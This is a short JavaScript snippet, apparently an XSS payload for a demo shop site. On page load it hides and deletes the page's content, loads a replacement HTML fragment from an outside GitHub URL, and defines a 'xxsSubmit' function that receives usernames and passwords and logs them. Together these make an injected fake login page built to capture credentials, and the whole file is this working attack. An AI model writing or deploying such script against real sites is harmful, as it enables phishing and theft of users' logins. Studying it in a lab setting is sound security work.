// Hide initial content
$(".row, .subheader").css("display", "none");

// Add place holder
var place_holder = document.createElement('div');
place_holder.className = "place_holder";
$("nav").after(place_holder);

$(window).on('load', function() {
    // Remove all unwanted content
    $(".row").remove();
    $('.place_holder').load("https://raw.githubusercontent.com/hotMS/Contoso-Stake/master/SkateShop/xxs_ph.html");
    console.log("done");
});

function xxsSubmit(username, password) {
    console.log("Username is: " + username);
    console.log("Password is: " + password);
}